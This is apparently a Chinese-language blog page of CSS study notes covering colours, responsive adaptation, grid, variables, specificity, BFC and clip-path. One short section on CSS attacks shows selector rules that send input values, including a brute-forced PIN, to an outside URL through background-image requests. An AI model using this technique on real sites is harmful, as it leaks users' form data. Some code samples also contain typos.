---
title: CSS
date: 2022-06-17 18:23:10
tags: CSS
categories: htmlcss
---
### 颜色

```js
4种表示法

1、英文单词
	color:red;

2、十六进制
	color:#RRGGBB; 
    //RR 红  GG 绿  BB 蓝  
    //值得范围 00-ff
    //简写 #RGB
3、rgb 颜色
	color:rgb(0,0,0);
	//红绿蓝
	//值得范围 0-255、0%-100%
	//rgba(0,0,0)  a 代表透明度  （0-1、0%-100%）
4、HSL
	HSL分别表示：
    -色相 色轮上的程度 0-360   （0，360表示红，120绿，240蓝）
    -饱和度 0%-100%  (0%灰色，100%全彩)
    -亮度	0%-100% （0%黑色，100%白色）
    注意：IE9,Firefox,Chrome,Safari,和Opera10+.支持HSL颜色值。其他三种基本都支持
```

<!--more-->

### 移动端适配方案

```js
//确定适配方案，常用适配方案：rem适配、viewport适配、百分比适配

rem适配（配合less或者sass可以做到所量即写）

(function(){
    let w = document.documentElement.clientWidth / 16;
    let styleNode = document.createElement('style');
    styleNode.innerHTML = "html{font-size:"+w+"px !important;}";
    document.head.appendChild(styleNode);
})();

viewport适配

(function(){
    // 获取理想视口的宽度
    let clientWidth = document.documentElement.clientWidth;
    // 设计稿的宽度为750px
    let targetW = 750;
    let scale = clientWidth / targetW;
    let metaDom = document.querySelector("meta[name='viewport']");
    // 设置initial-scale
    metaDom.content = "initial-scale="+ scale + ",minimum-scale="+ scale + ",maximum-scale=" + scale
})();

```

[CSS 纵横比（aspect ratio）](https://css-irl.info/aspect-ratio-is-great/)

```css
CSS 纵横比（aspect ratio）
// 监听 视口（当前页面，iframe视口） 宽高比变化，调整样式

/* 最小宽高比 */
@media (min-aspect-ratio: 8/5) {
  div {
    background: #9af; /* blue */
  }
}

/* 最大宽高比 */
@media (max-aspect-ratio: 3/2) {
  div {
    background: #9ff;  /* cyan */
  }
}

/* 明确的宽高比, 放在最下部防止同时满足条件时的覆盖*/
@media (aspect-ratio: 1/1) {
  div {
    background: #f9a; /* red */
  }
}


<div id='inner'>
  Watch this element as you resize your viewport's width and height.
</div>
```

### js 监听 媒体查询 MediaQueryList

一个`MediaQueryList`对象在一个[`document`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document)上维持着一系列的[媒体查询 (en-US)](https://developer.mozilla.org/en-US/docs/Web/CSS/Media_Queries/Using_media_queries)，并负责处理当媒体查询在其 document 上发生变化时向监听器进行通知的发送。

### 网格布局

```html
<!--
1、box 是容器
    -display: grid /inline-grid 指定网格布局
    -grid-template-columns 列宽 px,% 都可以
    -grid-template-rows 行高 px,%,fr 都可以
    -grid-row-gap   行间距
    -grid-column-gap 列间距
    -grid-gap 简写； eg: grid-gap: 行间距，列间距
    -grid-template-areas 区域：将一个或多个单元格划分为一个区域
        // 9个单元格，分为3个区域
        grid-template-areas: 'a a a'
                             'b b b'
                             'c c c';
        -区域的命名会影响到网格线。每个区域的起始网格线，会自动命名为区域名-start，终止网格线自动命名为区域名-end。
    -grid-auto-flow: row, column，row dense,column dense
    -justify-items 属性，项目内容水平start | end | center | stretch
    -align-items 属性，项目内容垂直 start | end | center | stretch
    -place-items 属性， 简写 place-items: 水平 垂直;
    -justify-content 属性，整个内容区域在容器里面的水平位置 start | end | center | stretch | space-around | space-between | space-evenly;
    -align-content 属性，整个内容区域在容器里面的垂直位置 start | end | center | stretch | space-around | space-between | space-evenly;
    -place-content 属性 简写 place-content: <align-content> <justify-content>;
    -grid-auto-columns 属性，多余网格的列宽【当网格只有3X3但指定4行2列位置时时会生成多余的网格】
    -grid-auto-rows 属性，多余网格的行高
    -辅助函数
        -repeat(重复数, 值) 设置行高，列宽使用 eg: repeat(3, 100px 150px 200px) 定义了9个项目列宽行高
        -minmax()   产生一个长度范围，表示长度就在这个范围之中。它接受两个参数，分别为最小值和最大值。
    -关键字
        -auto-fill 在repeat中使用，示自动填充。项目充满容器
        -fr ，1fr 代表1倍列宽，2fr代表2倍列宽
        -auto 由浏览器自己决定长度

2、box>div 是项目，span不是
-（项目）的float、display: inline-block、display: table-cell、vertical-align和column-*等设置都将失效
    ▣项目位置
        -grid-column-start属性：左边框所在的垂直网格线
        -grid-column-end属性：右边框所在的垂直网格线
        -grid-row-start属性：上边框所在的水平网格线
        -grid-row-end属性：下边框所在的水平网格线
        -grid-column 属性，简写：grid-column: <start-line> / <end-line>;
        -grid-row 属性， 简写：grid-row: <start-line> / <end-line>;
        -grid-area 属性，指定项目放在哪一个区域。
            .grid-area: a;// 指定项目放在a区域
            .简写：grid-area: <row-start> / <column-start> / <row-end> / <column-end>; // grid-area: 1 / 1 / 3 / 3;
        -justify-self 属性，置单元格内容的水平位置
        -align-self 属性，设置单元格内容的垂直位置
        -place-self 属性。place-self: <align-self> <justify-self>;
    -关键字
        -span 跨越了多少个网格

3、容器里面的水平区域称为"行"（row）垂直区域称为"列"（column）。

4、行和列的交叉区域，称为"单元格"（cell）
    -正常情况下，n行和m列会产生n x m个单元格。比如，3行3列会产生9个单元格。

5、网格线"（grid line）
    -正常情况下，n行有n + 1根水平网格线，m列有m + 1根垂直网格线，比如三行就有四根水平网格线
    -指定网格线的名字 
        grid-template-columns: [c1] 100px [c2] 100px [c3] auto [c4]
        grid-template-rows: [r1 s1] 100px [r2] 100px [r3] auto [r4] // 可设置多个名字
-->
    <div class="box">
        <div><span>1</span></div>
        <div>2</div>
        <div>3</div>
        <div>4</div>
        <div>5</div>
    </div>
```

内容超出三行显示省略

```css
 .overflow3 {
    display: -webkit-box;
    overflow: hidden;
    text-overflow: ellipsis;
    word-break: break-all;
    -webkit-box-orient: vertical;
    -webkit-line-clamp: 3;
    white-space: normal;
}
```

### css 攻击

```html
1、style-src 中的“unsafe-inline” 通过css窃取页面数据
<html>
  <style>
    input[value="a"] { background: url(https://example.com/?value=a); }
  </style>
<input type=text value=a>
    
    
<html>
  <style>
    input[value="0000"] { background: url(https://example.com/?value=0000); }
    input[value="0001"] { background: url(https://example.com/?value=0001); }
    ...
    input[value="9998"] { background: url(https://example.com/?value=9998); }
    input[value="9999"] { background: url(https://example.com/?value=9999); }
  </style>
<input name=pin type=number value=1337>
```

### 运用 transform 导致文本模糊的现象

```js
问题： 一块区域内的文本或者边框，在展示的时候，变得特别的模糊

1、当文本元素的某个祖先容器存在 transform: translate() 或者 transform: scale() 等 transform 操作时，容易出现这种问题
	必要不充分条件
2、元素作用了 transform: translate() 或者 transform: scale() 后的计算值产生了非整数
	必要不充分条件，不是所有小数值情况都会导致
    
3、文本内容是否模糊还与屏幕有关，高清屏（dpr > 2）下不容易触发，更多发生在普通屏幕下（dpr = 1）

	dpr = 物理像素 / 设备独立像素，表示设备像素比。这个与我们通常说的视网膜屏（多倍屏，Retina屏）有关。设备像素比描述的是未缩放状态下，物理像素和设备独立像素的初始比例关系。

4、并非所有浏览器都是这个表现，基本发生在 chromium 内核。
为何发生这种现象呢？
那么，为何会发生这种现象？针对这个问题，没有找到特别官方的回答，普遍的认为是因为：

由于浏览器将图层拆分到 GPU 以进行 3D 转换，而非整数的像素偏移，使得 Chrome 在字体渲染的时候，不是那么的精确。

社区里给出的一种方案：

-▪给元素设置 -webkit-font-smoothing: antialiased
font-smooth CSS 属性用来控制字体渲染时的平滑效果，该特性是非标准的，我们应该尽量不要在生产环境中使用它。并且在我的实测中，这个方法不太奏效。

-▪保证运用了 transform: translate() 或者 transform: scale() 的元素的高宽为偶数

	如果你赋予给元素的 transform 的值非常明确，譬如我上文例子中的利用其来对元素进行水平垂直居中 -- transform: translate(-50%, -50%)，让元素的高宽为偶数这个方法是可行的，但如果当你无法确定transform 的值，譬如 transform: translateX(-31.24%) 或者是 transform: scale(1.05)，那这个方法依旧无法奏效。

-▪弃用 transform
```

### css variable （css变量）

> css 变量减少样式重复定义，比如同一个颜色值要在多个地方重复使用，以前通过 less 和 sass 预处理做到，现在 css 变量也可以做到，方便维护，提高可读性

```css
:root{
  --bgcolor: blue;
  --color: red;
}
p {
  color: var(--color);
}
div {
  backgroung-color: var(--bgcolor);
  color: var(--color)
}
```

在媒体查询中使用，精简代码，减少冗余

```css
.box {
  --base-size: 10;
  width: calc(var(--base-size)* 10px);
  height: clac(var(--base-size)* 5px);
  padding:calc(var(--base-size) * 1px);
}
@media screen and (min-width: 1480px) {
  .box{
    --base-size: 8;
  }
}
```

方便在 js 中使用

```js
// 设置变量
document.getElementById("box").style.setPropertyValue('--color', 'pink')
// 读取变量
doucment.getElementById('box').style.getPropertyValue('--color').trim()    //pink
// 删除变量
document.getElementById('box').style.removeProperty('--color')
```



### css specificity 权重

> `css specificity` 即 css 中关于选择器的权重，以下三种类型的选择器依次下降

1. `id` 选择器，如 `#app`
2. `class`、`attribute` 与 `pseudo-classes` 选择器，如 `.header`、`[type="radio"]` 与 `:hover`
3. `type` 标签选择器和伪元素选择器，如 `h1`、`p` 和 `::before`

其中通配符选择器 `*`，组合选择器 `+ ~ >`，否定伪类选择器 `:not()` 对优先级无影响

另有内联样式 `<div class="foo" style="color: red;"></div>` 及 `!important`(最高) 具有更高的权重



### 有哪些 css 属性不能展示动画效果

display,height 

css 不能在 display:none 和 display:block 之间进行动画

也不能在 height:0 和 height:auto 之间进行动画



### position: sticky

> `position: sticky` 可理解为 `relative` 与 `fixed` 的结合体
>
> MDN 的解释：position: sticky 在正常文档流中仍然保有位置，然后会相对于它的最近的滚动祖先和最近的块级祖先根据 top, left, right, bottom 的值进行偏移。元素偏移不会影响其他任何元素的位置，因为会为该元素创建一个新的层叠上下文，从而不会影响到页面上的其他元素

### 网页实现黑暗模式

```css
// 颜色对换
html[theme="dark-model"] {
  filter: invert(1) hue-rotate(180);
  transition: color 300ms, background-color 300ms; /*过渡动画*/
}

// 自定义，通过媒体查询 改变 根元素 颜色变量
@media (prefers-color-scheme: dark) {
  :root {
  }
}
```

### 隐藏元素的几种办法

#### 01 display: none

通过 CSS 操控 display，移出文档流

```css
display: none;
```

#### 02 opacity: 0

透明度为 0，仍在文档流中，当作用于其上的事件(如点击)仍有效

```css
opacity: 0;
```

#### 03 visibility: hidden

透明度为 0，仍在文档流中，**但作用于其上的事件(如点击)无效**，这也是 `visibility:hidden` 与 `opacity: 0` 的区别

```css
visibility: hidden;
```

#### 04 content-visibility

移出文档流，但是再次显示时消耗性能低

```css
content-visibility: hidden;
```

#### 05 绝对定位于当前页面的不可见位置

```css
position: absolute;
top: -9000px;
left: -9000px;
```

#### 06 字体大小设置为 0

```css
font-size: 0;
```



### 大屏三等分，中屏二等分，小屏1等分

```html
<style>
	@media (min-width: 768px) {
      .container {
        grid-template-columns: repeat(2, minmax(0,1fr));
      }
    }

    @media (min-width: 1024px) {
      .container {
        grid-template-columns: repeat(3, minmax(0, 1fr));
      }
    }

    .container {
      display: grid;
      // grid-template-columns: repeat(1, 1fr);
    }

    .container {
      background-color: #eee;
      gap: 1rem;
    }

    .item {
      background-color: #aaa;
      height: 300px;
      border: 1px solid #888;
    }
</style>

<div class="container">
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
  <div class="item"></div>
</div>
```

### 自定义滚动条的样式

> 滚动条相关样式都是伪元素，以 `scrollbar` 打头，有以下伪元素，从 `-webkit` 中可见兼容性一般，不过无所谓，现在 Chrome 浏览器占大头

- `::-webkit-scrollbar` — 整个滚动条.
- `::-webkit-scrollbar-button` — 滚动条上的按钮 (上下箭头).
- `::-webkit-scrollbar-thumb` — 滚动条上的滚动滑块.
- `::-webkit-scrollbar-track` — 滚动条轨道.
- `::-webkit-scrollbar-track-piece` — 滚动条没有滑块的轨道部分.
- `::-webkit-scrollbar-corner` — 当同时有垂直滚动条和水平滚动条时交汇的部分.
- `::-webkit-resizer` — 某些元素的 corner 部分的部分样式(例:textarea 的可拖动按钮).

```css
// 但其实最常用的是以下几个伪元素：滚动条、滑块、轨道，如下滚动条设置成功

# 滚动条
::-webkit-scrollbar {
  width: 6px;
  height: 6px;
}

# 滑块
::-webkit-scrollbar-track {
  border-radius: 3px;
  background: rgba(0, 0, 0);
  box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.08);
}

# 轨道
::-webkit-scrollbar-thumb {
  border-radius: 3px;
  background: rgba(0, 0, 1);
  box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.2);
}
```

### 网站字体设置默认字体优先

```css
font-family: system-ui;

eg: bootstrap.css 

$font-family-sans-serif: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue",
  Arial, "Noto Sans", "Liberation Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji",
  "Segoe UI Symbol", "Noto Color Emoji" !default;
```

### css 避免命名冲突

1. BME式：即less、scss 的那种嵌套写法
2. css scoped: 如 vue 样式的 scoped 属性
3. css module 



### css 实现方格背景

```css
background: linear-gradient(90deg, rgba(200, 200, 200, 0.1) 3%, transparent 0),
  linear-gradient(rgba(200, 200, 200, 0.1) 3%, transparent 0);
background-size: 20px 20px;
```

### css 实现超出省略，超出多行省略

```css
1、超出省略

overflow: hidden;
text-overflow: ellipsis;
white-space: nowrap;

2、超出多行省略

overflow: hidden;
display: -webkit-box;
-webkit-box-orient: vertical;
-webkit-line-clamp: 2;
```



### [垂直居中长度为父容器一半的子元素](https://codepen.io/shanyue/pen/GRWmaVw)

设置 子元素宽度为父元素一半，再通过 aspect-ratio: 1/1; 设置宽高比 ​1:1即可

```html
<style>
	.container {
      display: grid;
      place-items: center;
    }

    .item {
      width: 50%;
      aspect-ratio: 1/1;
    }

    // 以下是样式代码

    .item {
      background-color: skyblue;
    }

    .container {
      height: 600px;
      background-color: #ccc;
      border: 1px solid red; 
    }
</style>

<div class="container">
  <div class="item"></div>
</div>
```

### BFC 块级格式化上下文

> 块格式化上下文（Block Formatting Context，BFC）是Web页面的可视化CSS渲染的一部分，是布局过程中生成块级盒子的区域，也是浮动元素与其他元素的交互限定区域。
>
> - BFC 是一个独立的布局环境,可以理解为一个容器,在这个容器中按照一定规则进行物品摆放,并且**不会影响其它环境中的物品**。
> - **如果一个元素符合触发 BFC 的条件，则 BFC 中的元素布局不受外部影响。**
> - 浮动元素会创建 BFC，则浮动元素内部子元素主要受该浮动元素影响，所以**两个浮动元素之间是互不影响的**。

- 创建BFC
	1. 根元素或包含根元素的元素
	2. 浮动元素 float ＝ left | right 或 inherit**（≠ none）**
	3. 绝对定位元素 position ＝ absolute 或 fixed
	4. display ＝ inline-block | flex | inline-flex | table-cell 或 table-caption
	5. overflow ＝ hidden | auto 或 scroll **(≠ visible)**
- BFC特性
	1. BFC 是一个独立的容器，容器内子元素不会影响容器外的元素。反之亦如此。
	2. 盒子从顶端开始垂直地一个接一个地排列，盒子之间垂直的间距是由 margin 决定的。
	3. 在同一个 BFC 中，两个相邻的块级盒子的**垂直外边距**会发生重叠。
	4. **BFC 区域不会和 float box 发生重叠。**
	5. **BFC 能够识别并包含浮动元素，当计算其区域的高度时，浮动元素也可以参与计算了。**
- BFC 作用
	1. 包含浮动元素时（清除浮动）不会出现高度塌陷【若是通过定位脱离文档流，导致的高度塌陷则没有办法】
	2. 避免外边距折叠，不同BFC包裹元素外边距才不会折叠

> 外边距折叠：**外边距折叠的条件是 margin 必须相邻!**
>
> - 两个相邻的外边距都是 **正数** 时，折叠外边距是两者中较大的值。
> - 两个相邻的外边距都是 **负数** 时，折叠外边距是两者中绝对值较大的值。
> - 两个相邻的外边距是 **一正一负** 时，折叠外边距是两者相加的和。
>
> [原文地址传送](https://segmentfault.com/a/1190000013647777)

### rem、em、vw、vh 的值各是什么意思

- `rem`: 根据根元素(即 `html`)的 `font-size`
- `em`: 根据**自身元素**的 `font-size`
- `vw`: viewport width
- `vh`: viewport height

### normalize.css 与 reset.css 又何区别

- [normalize.css (opens new window)](https://github.com/necolas/normalize.css/blob/master/normalize.css): 会保留有用的样式，比如 h1 的字体大小
- [reset.css (opens new window)](https://github.com/jgthms/minireset.css/blob/master/minireset.css): 把所有样式都重置，比如 h1、h2、h3 的字体大小都进行了重置，保持了无样式



### CSS 的盒模型

- 标准盒模型 width = content-width height = content-height
- 怪异盒模型 width = content-width + padding + border height = content-height + padding + border

### 样式裁剪

> [示例](https://developer.mozilla.org/zh-CN/docs/Web/CSS/clip-path#%E7%A4%BA%E4%BE%8B)

```css
语法：
clip-path = 
  <clip-source>                        |
  [ <basic-shape> || <geometry-box> ]  |
  none                                 

// 用其他图片来裁剪图片
<clip-source> = 
  <url>  

// 选定盒模型
<geometry-box> = 
  <shape-box>  |
  fill-box     |
  stroke-box   |
  view-box     

<shape-box> = 
  <box>       |
  margin-box  

<box> = 
  border-box   |
  padding-box  |
  content-box  

// basic-shape 裁剪形状
// 圆形裁剪
clip-path: circle(50%);

// 
clip-path: ellipse(130px 140px at 10% 20%);

// 
clip-path: polygon(50% 0, 100% 50%, 50% 100%, 0 50%);

// 路径裁剪
clip-path: path('M 0 200 L 0,75 A 5,5 0,0,1 150,75 L 200 200 z');
```

